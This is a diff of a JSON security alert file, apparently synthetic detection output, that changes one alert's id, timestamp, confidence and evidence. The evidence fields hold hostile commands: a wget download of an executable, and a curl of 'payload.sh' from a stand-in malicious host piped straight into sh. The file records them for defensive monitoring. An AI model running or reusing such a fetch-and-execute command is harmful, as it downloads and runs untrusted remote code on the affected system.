@@ -1,16 +1,16 @@
 {
-  "generated_at": "2025-10-16T15:21:18.398927+00:00",
+  "generated_at": "2025-10-16T16:26:10.517164+00:00",
   "count": 1,
   "alerts": [
     {
-      "id": "alert-22151",
-      "timestamp": "2025-10-16T15:21:18.398908+00:00",
-      "summary": "MEDIUM confidence: Suspicious command observed from 167.99.40.11",
-      "confidence": "medium",
+      "id": "alert-64438",
+      "timestamp": "2025-10-16T16:26:10.517147+00:00",
+      "summary": "LOW confidence: Suspicious command observed from 104.21.23.45",
+      "confidence": "low",
       "evidence": {
         "process": "cmd.exe",
-        "command": "wget http://10.0.0.5/p.exe -O /tmp/p.exe",
-        "source_ip": "167.99.40.11"
+        "command": "curl http://malicious.example/payload.sh | sh",
+        "source_ip": "104.21.23.45"
       }
     }
   ]
